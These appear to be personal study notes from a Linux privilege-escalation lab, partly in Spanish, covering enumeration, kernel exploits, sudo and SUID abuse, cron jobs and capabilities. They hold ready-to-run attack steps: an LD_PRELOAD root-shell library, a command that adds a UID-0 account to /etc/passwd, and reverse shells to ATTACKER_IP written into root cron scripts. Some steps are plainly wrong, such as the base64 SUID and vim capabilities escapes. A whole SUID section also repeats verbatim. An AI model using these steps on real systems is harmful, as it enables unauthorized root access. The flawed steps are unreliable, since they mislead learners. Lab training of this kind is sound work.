Privilege escalation is a journey. There are no silver bullets, and much depends on the specific configuration of the target system. The kernel version, installed applications, supported programming languages, other users' passwords are a few key elements that will affect your road to the root shell.

This room was designed to cover the main privilege escalation vectors and give you a better understanding of the process. This new skill will be an essential part of your arsenal whether you are participating in CTFs, taking certification exams, or working as a penetration tester.

# What does "privilege escalation" mean?

At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.


Why is it important?

It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:

Resetting passwords
Bypassing access controls to compromise protected data
Editing software configurations
Enabling persistence
Changing the privilege of existing (or new) users
Execute any administrative command

# Linux Enumeration Commands

## Importance of Enumeration
Enumeration is crucial both before and after gaining access to a system. It helps identify system details, configurations, and potential vulnerabilities to escalate privileges or expand access.

## Key Commands and Their Uses

### Host and System Information
- **`hostname`**: Displays the target's hostname. Useful for identifying the system's role.
- **`uname -a`**: Provides kernel and system details. Helps identify kernel vulnerabilities.
- **`/proc/version`**: Reveals kernel version and compiler information.
- **`/etc/issue`**: Displays operating system information (can be customized).

### Process and User Information
- **`ps`**: Views running processes. Examples:
  - `ps -A`: Lists all processes.
  - `ps aux`: Shows processes with user and terminal details.
  - `ps axjf`: Displays processes in a tree format.
- **`id`**: Shows the user's privileges and group memberships.
- **`/etc/passwd`**: Lists system users. Use `grep home` to filter real users.

### History and Environment
- **`history`**: Displays previously run commands. May contain sensitive information.
- **`env`**: Lists environment variables. Useful for identifying compilers or scripting tools in the PATH.

### File and Directory Exploration
- **`ls -la`**: Displays detailed file and directory information, including hidden files.
- **`find`**: Searches for files and directories. Examples:
  - `find / -name flag1.txt`: Finds a file named "flag1.txt".
  - `find / -perm 0777`: Finds files with 777 permissions.
  - `find / -perm -u=s`: Identifies files with the SUID bit set.
  - Use `2>/dev/null` to suppress errors.

### Privilege Escalation
- **`sudo -l`**: Lists commands the user can run with sudo privileges.
- **Writable or Executable Directories**:
  - `find / -writable -type d 2>/dev/null`: Finds writable directories.
  - `find / -perm -o x -type d 2>/dev/null`: Finds executable directories.

### Networking Information
- **`ifconfig`**: Displays network interfaces.
- **`ip route`**: Shows routing table.
- **`netstat`**: Examines network connections. Examples:
  - `netstat -a`: Lists all connections and listening ports.
  - `netstat -tp`: Displays connections with service and PID.
  - `netstat -ano`: Shows all sockets, without resolving names, and timers.

## General Tools and Commands
Familiarity with general Linux commands like `grep`, `cut`, `sort`, and `locate` is essential for efficient enumeration and data extraction.

---

Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.

The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.

- **LinPeas**: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- **LinEnum**: https://github.com/rebootuser/LinEnum
- **LES (Linux Exploit Suggester)**: https://github.com/mzet-/linux-exploit-suggester
- **Linux Smart Enumeration**: https://github.com/diego-treitos/linux-smart-enumeration
- **Linux Priv Checker**: https://github.com/linted/linuxprivchecker

---

# Privilege Escalation: Kernel Exploits

Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.

Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.

The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.

The Kernel exploit methodology is simple:

1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit

Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.

### Research sources:

- Based on your findings, you can use Google to search for an existing exploit code.
- Sources such as https://www.cvedetails.com/ can also be useful.
- Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).

### Hints/Notes:

- Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
- Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
- Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
- You can transfer the exploit code from your machine to the target system using the SimpleHTTPServer Python module and wget respectively.

# Escalación de Privilegios en Linux Kernel

## Paso 1: Verificar la versión del Kernel
Para determinar la versión del kernel en uso, ejecutamos el siguiente comando:

```bash
cat /proc/version
```

## Paso 2: Identificar la distribución y versión de Linux
Para obtener información detallada del sistema operativo, usamos:

```bash
lsb_release -a
```

Esto nos permitirá verificar la versión exacta y comprobar si existen vulnerabilidades conocidas.

## Paso 3: Buscar exploits disponibles
Usamos `searchsploit` para encontrar exploits de escalación de privilegios basados en la versión del kernel.

Por ejemplo, si el kernel es `3.13.0`, ejecutamos:

```bash
searchsploit 3.13.0
```

Si encontramos un exploit relevante, lo descargamos con:

```bash
searchsploit -m linux/local/37292.c
```

## Paso 4: Transferir el exploit al sistema objetivo
Para facilitar la transferencia del exploit, configuramos un servidor HTTP en nuestra máquina atacante:

```bash
python3 -m http.server 8080
```

En la máquina víctima, primero nos movemos al directorio `/tmp`, ya que es el único lugar donde se permite la descarga:

```bash
cd /tmp
```

Luego, descargamos el exploit con `wget`:

```bash
wget http://[IP-ATACANTE]:8080/37292.c
```

## Paso 5: Compilar y ejecutar el exploit
Una vez transferido, compilamos el exploit:

```bash
gcc 37292.c -o exploit
```

Luego, lo ejecutamos para intentar la escalación de privilegios:

```bash
./exploit
```

Si el exploit es exitoso, obtendremos acceso como usuario root.
  
---

# Privilege Escalation: Sudo

# Privilege Escalation in Linux

## Using sudo
The `sudo` command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.

Any user can check its current situation related to root privileges using the `sudo -l` command.

[GTFOBins](https://gtfobins.github.io/) is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.

## Leverage application functions
Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.

In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (`-f` : specify an alternate ServerConfigFile).

Loading the `/etc/shadow` file using this option will result in an error message that includes the first line of the `/etc/shadow` file.

## Leverage LD_PRELOAD
On some systems, you may see the `LD_PRELOAD` environment option.

`LD_PRELOAD` is a function that allows any program to use shared libraries. This blog post will give you an idea about the capabilities of `LD_PRELOAD`. If the `env_keep` option is enabled, we can generate a shared library which will be loaded and executed before the program is run. Please note the `LD_PRELOAD` option will be ignored if the real user ID is different from the effective user ID.

The steps of this privilege escalation vector can be summarized as follows:

1. Check for `LD_PRELOAD` (with the `env_keep` option)
2. Write a simple C code compiled as a shared object (`.so` extension) file
3. Run the program with sudo rights and the `LD_PRELOAD` option pointing to our `.so` file

The C code will simply spawn a root shell and can be written as follows:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

We can save this code as `shell.c` and compile it using `gcc` into a shared object file using the following parameters:

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, `find`, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the `LD_PRELOAD` option, as follows:

```bash
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

This will result in a shell spawn with root privileges.


# Privilege Escalation in Linux Sudo

## Enumerating sudo Permissions
To identify possible privilege escalation vectors, we start by checking the `sudo` privileges of the current user:

```bash
sudo -l
```

### Example Output:
```bash
karen@ip-10-10-230-150:/$ sudo -l
Matching Defaults entries for karen on ip-10-10-230-150:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User karen may run the following commands on ip-10-10-230-150:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
```

Since `find`, `less`, and `nano` are available with `NOPASSWD`, we check [GTFOBins](https://gtfobins.github.io/) for ways to escalate privileges using these binaries.

## Exploiting `find`
Using `find`, we can escalate privileges with the following command:

```bash
sudo find . -exec /bin/sh \; -quit
```

This will grant us a root shell.

## Exploiting `nmap`
If `nmap` were available with sudo privileges, we could escalate privileges using its interactive mode:

```bash
sudo nmap --interactive
```

Once inside, we run:

```bash
!sh
```

This will drop us into a root shell.

## Searching for Passwords
To check for stored passwords in `/etc/shadow`, we use:

```bash
sudo cat /etc/shadow | grep <username>
```

Replacing `<username>` with the target username if known.

---

# Linux Privilege Escalation using SUID

Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with **SUID (Set-user Identification)** and **SGID (Set-group Identification)**. These allow files to be executed with the permission level of the file owner or the group owner, respectively.

You will notice these files have an **“s”** bit set showing their special permission level.

## Finding SUID Binaries
To list files that have the SUID bit set, use the following command:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

A good practice would be to compare executables on this list with **GTFOBins** ([GTFOBins](https://gtfobins.github.io)). Clicking on the **SUID** button will filter binaries known to be exploitable when the SUID bit is set ([Pre-filtered List](https://gtfobins.github.io/#+suid)).

## Exploiting SUID on `nano`
The list above shows that `nano` has the SUID bit set. Unfortunately, GTFOBins does not provide an easy exploitation method. In real-life privilege escalation scenarios, intermediate steps are often needed to leverage whatever small findings are available.

### Reading the `/etc/shadow` File
Since `nano` has the SUID bit set and is owned by `root`, we can use it to read and edit files at a higher privilege level than our current user. Two possible privilege escalation methods are:

#### 1. Read `/etc/shadow` and Crack Passwords

```bash
nano /etc/shadow
```

This will print the contents of the `/etc/shadow` file. We can then use the `unshadow` tool to create a crackable file for **John the Ripper**.

```bash
unshadow passwd.txt shadow.txt > passwords.txt
```

Using a correct wordlist and some luck, **John the Ripper** can return one or several passwords in cleartext. More details about **John the Ripper** can be found here: [John The Ripper](https://tryhackme.com/room/johntheripper0).

#### 2. Add a New Root User
Instead of cracking passwords, we can **add a new user with root privileges** to bypass the process.

##### Generate a Password Hash

```bash
openssl passwd -1 -salt my_salt mypassword
```

This will generate a hash value for the password we want to set for the new user.

##### Edit `/etc/passwd` to Add the New User
Open `/etc/passwd` using `nano`:

```bash
nano /etc/passwd
```

Add the following line:

```plaintext
newroot:x:0:0::/root:/bin/bash
```

This will create a user `newroot` with UID 0 (root privileges).

##### Switch to the New User

```bash
su newroot
```

If everything was done correctly, we should now have root privileges.


# 🔐 Ejercicio SUID

## 🚀 Acceso y recopilación de información

Accedemos al sistema mediante **SSH** y recopilamos información básica del sistema:

```bash
uname -a
```

## 🔎 Identificación de binarios con permisos SUID

Buscamos archivos con el bit **SUID** activado:

```bash
find / -perm -u=s -type f 2>/dev/null
```

## 📌 Identificación de binarios vulnerables

Consultamos la página de [GTFOBins](https://gtfobins.github.io/) para identificar comandos con SUID que puedan explotarse.

---

### 🛠 Caso de estudio: `base64`

Si encontramos `base64` con SUID, revisamos en **GTFOBins** los comandos sugeridos para explotarlo. Ejecutamos:

```bash
echo "id" | base64 | base64 -d | sh
```

✅ Esto nos permite ejecutar comandos como **root** si `base64` tiene el bit **SUID** activado.

---

# Linux Privilege Escalation using SUID and Cron Jobs

Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with **SUID (Set-user Identification)** and **SGID (Set-group Identification)**. These allow files to be executed with the permission level of the file owner or the group owner, respectively.

You will notice these files have an **“s”** bit set showing their special permission level.

## Finding SUID Binaries
To list files that have the SUID bit set, use the following command:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

A good practice would be to compare executables on this list with **GTFOBins** ([GTFOBins](https://gtfobins.github.io)). Clicking on the **SUID** button will filter binaries known to be exploitable when the SUID bit is set ([Pre-filtered List](https://gtfobins.github.io/#+suid)).

## Exploiting SUID on `nano`
The list above shows that `nano` has the SUID bit set. Unfortunately, GTFOBins does not provide an easy exploitation method. In real-life privilege escalation scenarios, intermediate steps are often needed to leverage whatever small findings are available.

### Reading the `/etc/shadow` File
Since `nano` has the SUID bit set and is owned by `root`, we can use it to read and edit files at a higher privilege level than our current user. Two possible privilege escalation methods are:

#### 1. Read `/etc/shadow` and Crack Passwords

```bash
nano /etc/shadow
```

This will print the contents of the `/etc/shadow` file. We can then use the `unshadow` tool to create a crackable file for **John the Ripper**.

```bash
unshadow passwd.txt shadow.txt > passwords.txt
```

Using a correct wordlist and some luck, **John the Ripper** can return one or several passwords in cleartext. More details about **John the Ripper** can be found here: [John The Ripper](https://tryhackme.com/room/johntheripper0).

#### 2. Add a New Root User
Instead of cracking passwords, we can **add a new user with root privileges** to bypass the process.

##### Generate a Password Hash

```bash
openssl passwd -1 -salt my_salt mypassword
```

This will generate a hash value for the password we want to set for the new user.

##### Edit `/etc/passwd` to Add the New User
Open `/etc/passwd` using `nano`:

```bash
nano /etc/passwd
```

Add the following line:

```plaintext
newroot:x:0:0::/root:/bin/bash
```

This will create a user `newroot` with UID 0 (root privileges).

##### Switch to the New User

```bash
su newroot
```

If everything was done correctly, we should now have root privileges.

---

## Privilege Escalation Using Cron Jobs
Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.

The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

### Finding and Exploiting Cron Jobs
Cron job configurations are stored as **crontabs (cron tables)**. Each user on the system has their crontab file and can run specific tasks whether they are logged in or not. Our goal is to find a **cron job set by root** and have it execute our script, ideally a shell.

#### Viewing System-Wide Cron Jobs
Any user can read the file keeping system-wide cron jobs:

```bash
cat /etc/crontab
```

#### Modifying a Vulnerable Cron Job
If a scheduled script, such as `backup.sh`, runs every minute and is writable by our user, we can modify it to execute a **reverse shell**:

```bash
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > /path/to/backup.sh
```

Start a listener on the attacking machine to catch the reverse shell:

```bash
nc -lvnp 4444
```

#### Exploiting Orphaned Cron Jobs
A common misconfiguration occurs when administrators **delete a script but forget to remove the cron job**. If the full path of the script is not defined, cron will search for it in the directories listed under the `PATH` variable in `/etc/crontab`. If we create a script named **antivirus.sh** under our home directory, the cron job will execute it:

```bash
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > ~/antivirus.sh
chmod +x ~/antivirus.sh
```

If successful, the reverse shell connection will have **root privileges**.

---

## Conclusion
Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. If you find an existing script or task attached to a cron job, spend time understanding its function and how tools like `tar`, `7z`, or `rsync` may be exploited using wildcard features.

Now it's your turn to use the skills you were just taught to find a vulnerable binary or cron job that can be exploited.

# ⏳ Ejercicio Cron Jobs

## 🔍 Análisis Inicial

Comenzamos obteniendo información del sistema:

```bash
uname -a
```

También podemos usar herramientas como **linpeas** para automatizar el proceso de análisis.

---

## 📆 Identificar Tareas Programadas

Localizamos las tareas programadas revisando el archivo **/etc/crontab**:

```bash
cat /etc/crontab
```

Si encontramos un archivo **backup.sh** que se ejecuta como **root** y tenemos permisos para modificarlo dentro del usuario *karen*, podemos aprovecharlo.

---

## 🛠 Explotación

1. **Editamos el script** y le damos permisos de ejecución:

   ```bash
   echo "bash -i >& /dev/tcp/TU_IP/8888 0>&1" >> /ruta/a/backup.sh
   chmod +x /ruta/a/backup.sh
   ```

2. **Iniciamos un listener en nuestra máquina:**

   ```bash
   nc -lvnp 8888
   ```

3. **Esperamos a que se ejecute la tarea programada.** Cuando el cron job se ejecute, obtendremos acceso como **root** en el sistema.

---

## Privilege Escalation Using Capabilities

System administrators can use "Capabilities" to increase the privilege level of a process or binary at a more granular level. This allows specific privileges to be granted without giving full higher privileges to a user.

### Example Use Case
If a SOC analyst needs to use a tool that initiates socket connections, a regular user would not have the necessary permissions. Instead of granting full administrative privileges, the system administrator can modify the capabilities of the binary, allowing it to complete its task without needing a higher privilege user.

### Listing Enabled Capabilities
We can use the `getcap` tool to check the capabilities set on files.

```bash
getcap -r /
```

When run as an unprivileged user, the above command will generate many errors. It is best practice to redirect error messages to `/dev/null`:

```bash
getcap -r / 2>/dev/null
```

### Capabilities and SUID
Unlike SUID-based privilege escalation, capabilities do not require the SUID bit to be set. This means that traditional enumeration techniques looking for SUID binaries will not reveal capabilities-based privilege escalation vectors.

### Exploiting Capabilities for Privilege Escalation
GTFObins provides a comprehensive list of binaries that can be used for privilege escalation if they have set capabilities.

#### Example: Escalating Privileges Using `vim`
If we find that `vim` has specific capabilities set, we can leverage it to spawn a root shell with the following command:

```bash
vim -c ':!sh'
```

This command will launch a root shell, allowing privilege escalation.

Ejercicio

---
